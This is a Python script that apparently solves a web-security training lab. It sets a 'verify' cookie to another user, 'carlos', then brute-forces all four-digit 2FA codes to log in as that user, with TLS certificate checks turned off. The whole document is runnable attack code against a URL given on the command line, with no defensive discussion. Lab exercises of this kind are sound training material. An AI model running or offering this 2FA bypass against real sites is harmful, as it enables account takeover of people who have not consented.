import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def get_session(s, url):
    s.get(f"{url}/login", verify=False)
    return True

def set_target_users(s, url, username):
    domain = url.replace("https://", "").replace("http://", "")
    s.cookies.set("verify", username, domain=domain)
    s.get(f"{url}/login2", verify=False)

def submit_2fa_code(s,url, code):
    data = {"mfa-code": str(code).zfill(4)}
    r = s.post(f"{url}/login2", data=data, allow_redirects=True, verify=False)
    return r


def get_2fa_code(s, url):
    print("[*] Bruteforcing 2fa code...")
    for code in range(10000):
        sys.stdout.write(f"\r[+] Trying code: {str(code).zfill(4)}")
        sys.stdout.flush()
        r = submit_2fa_code(s, url, code)
        if "Your username is: carlos" in r.text:
            print(f"\n[+] Valid 2fa code: {str(code).zfill(4)}")
            return code
    print("\n[-] No valid 2fa code found")
    return None        

def main():
        if len(sys.argv) != 2:
            print(f"Usage: {sys.argv[0]} <url>")
            sys.exit()

        url = sys.argv[1].strip().rstrip("/")
        print(f"[*] Target: {url}")
        s = requests.Session()

        # step 1 - get a valid session
        print("[*] Getting a valid session cookie...")
        get_session(s, url)

        # step 2 - switch verify to carlos
        print("[*] Setting verify cookie to carlos...")
        set_target_users(s, url, "carlos")
        print("[*] Cookies:")
        print(s.cookies)
        print(s.cookies.get_dict())

        # step 3 - bruteforce 2fa code
        code = get_2fa_code(s, url)
        if code is None:
            sys.exit(1)

        # step 4 - verify lgoin
        r = s.get(f"{url}/my-account", verify=False)

        if "Your username is: carlos" in r.text:
            print("[+] Logged in as carlos")
            print("[+] Lab solved")
        else:
            print("[-] Login verification failed")

if __name__=="__main__":
    main()            

